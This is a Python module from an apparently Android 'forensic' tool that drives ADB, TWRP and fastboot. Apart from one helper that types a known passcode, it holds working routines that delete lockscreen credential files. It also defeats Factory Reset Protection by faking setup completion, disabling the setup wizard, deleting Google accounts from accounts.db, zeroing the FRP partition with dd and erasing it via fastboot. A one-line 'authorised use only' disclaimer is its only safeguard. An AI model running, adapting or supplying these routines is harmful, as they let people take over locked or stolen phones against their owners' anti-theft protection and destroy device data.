"""
core/bypass.py – Forensic screen-lock bypass (PIN / pattern).
For authorised forensic device access only.
"""
from __future__ import annotations
import threading
from typing import Callable
from core.i18n import t


# Files storing the lock hash on various Android versions
LOCKSCREEN_FILES = [
    "/data/system/gesture.key",
    "/data/system/password.key",
    "/data/system/gatekeeper.password.key",
    "/data/system/gatekeeper.pattern.key",
    "/data/system/locksettings.db",
    "/data/system/locksettings.db-wal",
    "/data/system/locksettings.db-shm",
]


class BypassManager:
    def __init__(self, adb):
        self.adb = adb  # ADBManager instance

    # ── Diagnostics ───────────────────────────────────────────────────────────

    def check_root_available(self) -> tuple[bool, str]:
        """Verify root access availability via ADB shell."""
        if not self.adb.connected_device:
            return False, t("byp.no_device_full")

        # Try su
        out = self.adb.shell("su -c 'id' 2>/dev/null")
        if "uid=0" in out or "root" in out:
            return True, f"su root: {out.strip()}"

        # Try adbd root (AOSP ROMs, Android ≤ 5 debug builds)
        rc, out2, _ = self.adb._run(
            ["-s", self.adb.connected_device, "root"], timeout=10
        )
        if rc == 0 and ("restarting" in out2.lower() or "already" in out2.lower()):
            import time; time.sleep(1.5)
            out3 = self.adb.shell("id")
            if "uid=0" in out3:
                return True, "adbd root (debug build)"

        # Verify direct execution
        out4 = self.adb.shell("id")
        if "uid=0" in out4:
            return True, "root (shell je uid=0)"

        return False, t("byp.root_unavailable")

    def check_twrp_active(self) -> tuple[bool, str]:
        """Determine whether the device is currently booted into TWRP recovery."""
        if not self.adb.connected_device:
            return False, t("byp.no_device_full")
        rc, state, _ = self.adb._run(
            ["-s", self.adb.connected_device, "get-state"], timeout=6
        )
        if rc != 0 or state.strip() != "recovery":
            label = {
                "device":     t("byp.state_device"),
                "bootloader": t("byp.state_bootloader_mode"),
                "sideload":   t("byp.state_sideload"),
            }.get(state.strip(),
                  t("byp.state_fmt").format(v=state.strip() or t("byp.state_unknown_val")))
            return False, label

        # We're in recovery — verify TWRP
        twrp_ver = self.adb.shell("getprop ro.twrp.version 2>/dev/null").strip()
        if twrp_ver:
            return True, f"TWRP {twrp_ver}"
        twrp_bin = self.adb.shell("ls /sbin/twrp 2>/dev/null").strip()
        if twrp_bin:
            return True, t("byp.twrp_no_ver")
        return True, t("byp.twrp_unknown_type")

    def get_android_version(self) -> int:
        """Return the major Android version number (0 = unknown)."""
        try:
            ver = self.adb.shell("getprop ro.build.version.release").strip()
            return int(ver.split(".")[0])
        except Exception:
            return 0

    def check_encryption(self) -> str:
        """Return a description of /data partition encryption."""
        state = self.adb.shell("getprop ro.crypto.state 2>/dev/null").strip()
        enc_type = self.adb.shell("getprop ro.crypto.type 2>/dev/null").strip()
        if state == "encrypted":
            enc = enc_type.upper() if enc_type else "FDE"
            return t("byp.enc_encrypted").format(t=enc)
        if state == "unencrypted":
            return t("byp.enc_none")
        return state or t("byp.enc_unknown")

    def get_device_summary(self) -> dict:
        """Return key info for display in the panel."""
        android = self.get_android_version()
        enc = self.check_encryption()
        root_ok, root_info = self.check_root_available()
        twrp_ok, twrp_info = self.check_twrp_active()
        return {
            "android": android,
            "encryption": enc,
            "root_ok": root_ok,
            "root_info": root_info,
            "twrp_ok": twrp_ok,
            "twrp_info": twrp_info,
        }

    def _screen_size(self) -> tuple[int, int]:
        """Return the active (override, else physical) screen size in pixels."""
        import re
        out = self.adb.shell("wm size 2>/dev/null")
        matches = re.findall(r"(\d+)\s*x\s*(\d+)", out or "")
        if matches:
            w, h = matches[-1]  # 'Override size' (if present) wins over 'Physical size'
            return int(w), int(h)
        return 1080, 1920

    def is_screen_locked(self):
        """
        Best-effort keyguard state. Returns True (locked), False (unlocked)
        or None (could not determine) — the dumpsys key varies across versions.
        """
        import re
        out = self.adb.shell("dumpsys window 2>/dev/null")
        for key in ("mDreamingLockscreen", "mShowingLockscreen",
                    "isStatusBarKeyguard", "mKeyguardShowing"):
            m = re.search(key + r"\s*=\s*(true|false)", out or "")
            if m:
                return m.group(1) == "true"
        return None

    # ── Keyboard / hardware input unlock (broken touchscreen) ─────────────────

    def method_input_passcode(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
        passcode: str,
        mode: str = "pin",
    ):
        """
        Unlock the device by injecting a *known* passcode via ADB `input`,
        for when the touchscreen is dead. This is NOT a crack/bypass — the
        correct PIN / password / pattern must be supplied by the operator.

        mode:
          "pin"      – digits only; sent as individual key events (0-9).
          "password" – alphanumeric; sent via `input text` (no spaces/specials).
          "pattern"  – 3x3 grid node sequence (e.g. "1 2 3 6 9"); drawn via
                       `input motionevent` (Android 8+ only, coordinates approximate).
        """
        def _worker():
            import time, re

            if not self.adb.connected_device:
                done(False, t("byp.no_device_full"))
                return

            code = (passcode or "").strip()
            if not code:
                done(False, t("byp.kbd_err_empty"))
                return

            # ── 1. Wake the screen and reveal the entry field ─────────────────
            log(t("byp.kbd_log_wake"))
            self.adb.shell("input keyevent 224")   # KEYCODE_WAKEUP
            time.sleep(0.4)
            w, h = self._screen_size()
            log(t("byp.kbd_log_size").format(w=w, h=h))
            # Swipe up to dismiss the lockscreen curtain so the input shows
            self.adb.shell(f"input swipe {w // 2} {int(h * 0.80)} {w // 2} {int(h * 0.20)} 200")
            self.adb.shell("input keyevent 82")    # KEYCODE_MENU (helps older ROMs)
            time.sleep(0.3)

            # ── 2. Enter the credential ───────────────────────────────────────
            if mode == "pin":
                if not code.isdigit():
                    done(False, t("byp.kbd_err_pin_digits"))
                    return
                log(t("byp.kbd_log_typing_pin").format(n=len(code)))
                for ch in code:
                    # KEYCODE_0 == 7, so digit d -> 7 + d  (no shell interpolation of input)
                    self.adb.shell(f"input keyevent {7 + int(ch)}")
                    time.sleep(0.05)
                self.adb.shell("input keyevent 66")   # ENTER

            elif mode == "password":
                if not re.fullmatch(r"[A-Za-z0-9]+", code):
                    done(False, t("byp.kbd_err_pw_charset"))
                    return
                log(t("byp.kbd_log_typing_pw").format(n=len(code)))
                self.adb.shell(f"input text {code}")
                time.sleep(0.2)
                self.adb.shell("input keyevent 66")   # ENTER

            elif mode == "pattern":
                seq = re.findall(r"[1-9]", code)
                if len(seq) < 2:
                    done(False, t("byp.kbd_err_pattern"))
                    return
                log(t("byp.kbd_log_pattern").format(seq="-".join(seq)))
                # Approximate 3x3 grid: centered horizontally, lower-middle of screen
                gx, gw = w * 0.15, w * 0.70
                cell = gw / 2.0           # spacing between adjacent dots
                top = h * 0.40
                coords = {}
                for d in range(1, 10):
                    r_, c_ = (d - 1) // 3, (d - 1) % 3
                    coords[str(d)] = (int(gx + c_ * cell), int(top + r_ * cell))
                x0, y0 = coords[seq[0]]
                self.adb.shell(f"input motionevent DOWN {x0} {y0}")
                for d in seq[1:]:
                    x, y = coords[d]
                    self.adb.shell(f"input motionevent MOVE {x} {y}")
                    time.sleep(0.08)
                xl, yl = coords[seq[-1]]
                self.adb.shell(f"input motionevent UP {xl} {yl}")

            else:
                done(False, t("byp.kbd_err_mode"))
                return

            # ── 3. Verify ─────────────────────────────────────────────────────
            time.sleep(0.9)
            locked = self.is_screen_locked()
            if locked is True:
                log(t("byp.kbd_log_still_locked"))
                done(False, t("byp.kbd_done_fail"))
            elif locked is False:
                done(True, t("byp.kbd_done_ok"))
            else:
                log(t("byp.kbd_log_unknown_state"))
                done(True, t("byp.kbd_done_sent"))

        threading.Thread(target=_worker, daemon=True).start()

    # ── Method 1 – ADB root delete ───────────────────────────────────────────

    def method_adb_root_delete(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        Delete lock files via root ADB shell.
        Supports Android 4–10 with available root (Magisk, SuperSU, adbd root).
        """
        def _worker():
            log(t("byp.log_check_root"))
            ok, info = self.check_root_available()
            if not ok:
                done(False, t("byp.err_no_root_m2"))
                return
            log(f"✔ Root: {info}")

            android = self.get_android_version()
            log(f"ℹ Android {android}")

            deleted, skipped = 0, 0
            for path in LOCKSCREEN_FILES:
                exists = self.adb.shell(
                    f"su -c '[ -f {path} ] && echo exists' 2>/dev/null"
                ).strip()
                if not exists:
                    log(t("byp.log_file_skip").format(name=path.split('/')[-1]))
                    skipped += 1
                    continue
                log(t("byp.log_deleting").format(path=path))
                result = self.adb.shell(f"su -c 'rm -f \"{path}\"' 2>&1").strip()
                if result and "No such" not in result and "Permission denied" not in result:
                    log(f"    ⚠ {result}")
                else:
                    log(t("byp.log_deleted"))
                    deleted += 1

            log(t("byp.log_delete_summary").format(deleted=deleted, skipped=skipped))
            if deleted == 0:
                done(False, t("byp.err_no_files_adb"))
                return
            log(t("byp.log_rebooting"))
            self.adb._run(
                ["-s", self.adb.connected_device, "reboot"], timeout=10
            )
            done(True, t("byp.done_files_deleted").format(n=deleted))

        threading.Thread(target=_worker, daemon=True).start()

    # ── Method 2 – TWRP delete ───────────────────────────────────────────────

    def method_twrp_delete(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        Mount /data in TWRP and delete lock files.
        Supports Android 4–13 (depends on FBE support in the TWRP build).
        """
        def _worker():
            log(t("byp.log_check_twrp"))
            ok, info = self.check_twrp_active()
            if not ok:
                done(False, t("byp.err_not_in_twrp").format(info=info))
                return
            log(f"✔ {info}")

            android = self.get_android_version()
            enc = self.check_encryption()
            log(t("byp.log_android_enc").format(android=android, enc=enc))

            if android >= 7 and "FBE" in enc.upper():
                log(t("byp.log_fbe_warn"))

            log(t("byp.log_mounting"))
            mount_out = self.adb.shell(
                "twrp mount /data 2>&1 || mount -o rw /data 2>&1 || echo mounted"
            ).strip()
            log(f"  → {mount_out or 'ok'}")

            test = self.adb.shell("ls /data/system/ 2>/dev/null | head -5").strip()
            if not test:
                done(False, t("byp.err_mount_fail"))
                return
            log(t("byp.log_data_ok").format(first=test.split()[0]))

            deleted, skipped = 0, 0
            for path in LOCKSCREEN_FILES:
                exists = self.adb.shell(
                    f"[ -f {path} ] && echo exists 2>/dev/null"
                ).strip()
                if not exists:
                    log(t("byp.log_file_skip").format(name=path.split('/')[-1]))
                    skipped += 1
                    continue
                log(t("byp.log_deleting").format(path=path))
                result = self.adb.shell(f"rm -f \"{path}\" 2>&1").strip()
                if result and "No such" not in result:
                    log(f"    ⚠ {result}")
                else:
                    log(t("byp.log_deleted"))
                    deleted += 1

            log(t("byp.log_delete_summary").format(deleted=deleted, skipped=skipped))
            if deleted == 0:
                done(False, t("byp.err_no_files_twrp"))
                return
            log(t("byp.log_rebooting_sys"))
            self.adb.shell("reboot 2>/dev/null")
            self.adb._run(["-s", self.adb.connected_device, "reboot"], timeout=10)
            done(True, t("byp.done_files_deleted").format(n=deleted))

        threading.Thread(target=_worker, daemon=True).start()

    # ── FRP bypass ───────────────────────────────────────────────────────────

    def check_frp_status(self) -> dict:
        """Determine FRP status and available bypass methods."""
        if not self.adb.connected_device:
            return {"error": t("byp.no_device_short")}

        android = self.get_android_version()
        root_ok, root_info = self.check_root_available()
        twrp_ok, twrp_info = self.check_twrp_active()

        frp_block = self.adb.shell(
            "ls /dev/block/by-name/frp 2>/dev/null || "
            "ls /dev/block/platform/*/by-name/frp 2>/dev/null || "
            "ls /dev/block/bootdevice/by-name/frp 2>/dev/null"
        ).strip()

        setup_done = self.adb.shell(
            "settings get secure user_setup_complete 2>/dev/null"
        ).strip()

        return {
            "android":    android,
            "root_ok":    root_ok,
            "root_info":  root_info,
            "twrp_ok":    twrp_ok,
            "twrp_info":  twrp_info,
            "frp_block":  frp_block,
            "setup_done": setup_done,
        }

    def frp_adb_settings(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        FRP Method 1 – bypass FRP via ADB setup settings.
        Works on Android 5–6 (unpatched). Limited on newer versions.
        """
        def _worker():
            log(t("byp.log_check_conn"))
            if not self.adb.connected_device:
                done(False, t("byp.no_device_full"))
                return

            android = self.get_android_version()
            log(f"ℹ Android {android}")

            success_count = 0

            cmds = [
                ("user_setup_complete",  "1", "secure"),
                ("device_provisioned",   "1", "global"),
                ("setup_wizard_has_run", "1", "secure"),
                ("oobe_has_run",         "1", "secure"),
            ]
            for name, value, table in cmds:
                log(t("byp.log_setup_item").format(table=table, name=name, value=value))
                r1 = self.adb.shell(
                    f"settings put {table} {name} {value} 2>&1"
                ).strip()
                r2 = self.adb.shell(
                    f"content insert --uri content://settings/{table} "
                    f"--bind name:s:{name} --bind value:s:{value} 2>&1"
                ).strip()
                if not r1 and not r2:
                    log(f"    ✔ OK")
                    success_count += 1
                else:
                    log(f"    → {r1 or r2}")

            log(t("byp.log_deactivate_gwz"))
            for pkg in [
                "com.google.android.setupwizard",
                "com.google.android.gmssetup",
            ]:
                out = self.adb.shell(f"pm disable-user --user 0 {pkg} 2>&1").strip()
                log(f"    {pkg}: {out or 'OK'}")

            log(t("byp.log_frp_accounts_del"))
            acct_paths = [
                "/data/system/users/0/accounts.db",
                "/data/system_de/0/accounts.db",
            ]
            for path in acct_paths:
                chk = self.adb.shell(f"[ -f '{path}' ] && echo ok 2>/dev/null").strip()
                if chk == "ok":
                    out = self.adb.shell(
                        f"sqlite3 '{path}' "
                        f"\"DELETE FROM accounts WHERE type='com.google';\" 2>&1"
                    ).strip()
                    log(f"    {path}: {out or '✔ OK'}")
                    success_count += 1

            log(t("byp.log_reboot_now"))
            self.adb._run(["-s", self.adb.connected_device, "reboot"], timeout=10)
            done(True, t("byp.done_frp_setup").format(n=success_count))

        threading.Thread(target=_worker, daemon=True).start()

    def frp_twrp_wipe(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        FRP Method 2 – wipe the FRP partition via TWRP recovery.
        Overwrites the FRP block device with zeros.
        """
        def _worker():
            log(t("byp.log_check_twrp"))
            ok, info = self.check_twrp_active()
            if not ok:
                done(False, t("byp.err_not_in_twrp").format(info=info))
                return
            log(f"✔ {info}")

            log(t("byp.log_frp_search"))
            frp_candidates = [
                "/dev/block/by-name/frp",
                "/dev/block/platform/msm_sdcc.1/by-name/frp",
                "/dev/block/platform/soc/7824900.sdhci/by-name/frp",
                "/dev/block/bootdevice/by-name/frp",
                "/dev/block/sda1",
            ]
            frp_block = None
            for candidate in frp_candidates:
                chk = self.adb.shell(
                    f"[ -e '{candidate}' ] && echo ok 2>/dev/null"
                ).strip()
                if chk == "ok":
                    frp_block = candidate
                    log(t("byp.log_frp_found").format(path=candidate))
                    break

            if not frp_block:
                twrp_out = self.adb.shell("twrp wipe frp 2>/dev/null").strip()
                if twrp_out and "done" in twrp_out.lower():
                    log(f"  ✔ TWRP wipe frp: {twrp_out}")
                    done(True, t("byp.done_frp_twrp_wipe"))
                    return
                done(False, t("byp.err_frp_not_found"))
                return

            log(t("byp.log_frp_overwrite").format(path=frp_block))
            out = self.adb.shell(
                f"dd if=/dev/zero of={frp_block} bs=512 2>&1"
            ).strip()
            log(f"  → {out or 'OK'}")

            verify = self.adb.shell(
                f"hexdump -C {frp_block} 2>/dev/null | head -3"
            ).strip()
            log(t("byp.log_verify").format(v=verify[:80] if verify else "—"))

            log(t("byp.log_rebooting_sys"))
            self.adb.shell("reboot 2>/dev/null")
            done(True, t("byp.done_frp_zeros").format(path=frp_block))

        threading.Thread(target=_worker, daemon=True).start()

    def frp_fastboot_erase(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        FRP Method 3 – erase FRP via fastboot.
        Requires an unlocked bootloader.
        """
        def _worker():
            log(t("byp.log_check_fastboot"))
            if not self.adb.connected_device:
                done(False, t("byp.no_device_full"))
                return

            rc, state, _ = self.adb._run(
                ["-s", self.adb.connected_device, "get-state"], timeout=6
            )
            if state.strip() != "bootloader":
                log(t("byp.log_not_bootloader").format(
                    v=state.strip() or t("byp.state_unknown_val")))
                log(t("byp.log_rebooting_bl"))
                self.adb._run(
                    ["-s", self.adb.connected_device, "reboot", "bootloader"],
                    timeout=10,
                )
                import time; time.sleep(5)
                log(t("byp.log_wait_fastboot"))
                time.sleep(3)

            log(t("byp.log_frp_erase_cmd"))
            rc, out, err = self.adb._run(
                ["fastboot", "-s", self.adb.connected_device, "erase", "frp"],
                timeout=30,
            )
            output = (out or "") + (err or "")
            log(f"  → {output.strip() or t('byp.log_no_output')}")

            if rc == 0 or "OKAY" in output:
                log(t("byp.log_frp_erased"))
                log(t("byp.log_booting_sys"))
                self.adb._run(
                    ["fastboot", "-s", self.adb.connected_device, "reboot"],
                    timeout=15,
                )
                done(True, t("byp.done_frp_fastboot"))
            elif "does not exist" in output.lower():
                done(False, t("byp.err_frp_no_partition"))
            elif "locked" in output.lower() or "permission" in output.lower():
                done(False, t("byp.err_bl_locked"))
            else:
                done(False, t("byp.err_fastboot_err").format(v=output.strip()))

        threading.Thread(target=_worker, daemon=True).start()

    def frp_root_delete_account(
        self,
        log: Callable[[str], None],
        done: Callable[[bool, str], None],
    ):
        """
        FRP Method 4 – delete the Google account from the database via root.
        Requires root access.
        """
        def _worker():
            log(t("byp.log_check_root"))
            ok, info = self.check_root_available()
            if not ok:
                done(False, t("byp.err_no_root_other"))
                return
            log(f"✔ Root: {info}")

            deleted = 0
            account_dbs = [
                "/data/system/users/0/accounts.db",
                "/data/system_de/0/accounts.db",
                "/data/system/accounts.db",
            ]

            for db_path in account_dbs:
                chk = self.adb.shell(
                    f"su -c '[ -f \"{db_path}\" ] && echo ok' 2>/dev/null"
                ).strip()
                if chk != "ok":
                    log(t("byp.log_file_skip").format(name=db_path))
                    continue

                log(t("byp.log_processing_db").format(path=db_path))

                accounts_raw = self.adb.shell(
                    f"su -c 'sqlite3 \"{db_path}\" "
                    f"\"SELECT name, type FROM accounts;\"' 2>/dev/null"
                ).strip()
                if accounts_raw:
                    log(t("byp.log_accounts_found"))
                    for line in accounts_raw.split("\n"):
                        log(f"      {line}")

                for account_type in [
                    "com.google",
                    "com.google.android.gm",
                ]:
                    out = self.adb.shell(
                        f"su -c 'sqlite3 \"{db_path}\" "
                        f"\"DELETE FROM accounts WHERE type='{account_type}';\"' 2>&1"
                    ).strip()
                    log(f"    DELETE {account_type}: {out or '✔ OK'}")
                    deleted += 1

                out2 = self.adb.shell(
                    f"su -c 'sqlite3 \"{db_path}\" "
                    f"\"DELETE FROM extras WHERE key LIKE '%frp%';\"' 2>&1"
                ).strip()
                if not out2:
                    log(t("byp.log_frp_extras"))

            frp_files = [
                "/data/system/frp_state",
                "/persistent/dp",
                "/mnt/vendor/persist/data/sfs/",
            ]
            for path in frp_files:
                out = self.adb.shell(
                    f"su -c 'rm -rf \"{path}\" 2>/dev/null && echo ok'"
                ).strip()
                if out == "ok":
                    log(t("byp.log_file_deleted").format(path=path))

            log(t("byp.log_op_count").format(n=deleted))
            log(t("byp.log_rebooting"))
            self.adb._run(["-s", self.adb.connected_device, "reboot"], timeout=10)
            done(True, t("byp.done_frp_root").format(n=deleted))

        threading.Thread(target=_worker, daemon=True).start()

    # ── Reboot commands ───────────────────────────────────────────────────────

    def reboot_recovery(self) -> tuple[bool, str]:
        if not self.adb.connected_device:
            return False, t("byp.no_device_short")
        rc, out, err = self.adb._run(
            ["-s", self.adb.connected_device, "reboot", "recovery"], timeout=10
        )
        return (True, t("byp.rebooting_recovery")) if rc == 0 else (False, err or out)

    def reboot_bootloader(self) -> tuple[bool, str]:
        if not self.adb.connected_device:
            return False, t("byp.no_device_short")
        rc, out, err = self.adb._run(
            ["-s", self.adb.connected_device, "reboot", "bootloader"], timeout=10
        )
        return (True, t("byp.rebooting_bootloader")) if rc == 0 else (False, err or out)

    def reboot_system(self) -> tuple[bool, str]:
        if not self.adb.connected_device:
            return False, t("byp.no_device_short")
        rc, out, err = self.adb._run(
            ["-s", self.adb.connected_device, "reboot"], timeout=10
        )
        return (True, t("byp.rebooting_system")) if rc == 0 else (False, err or out)
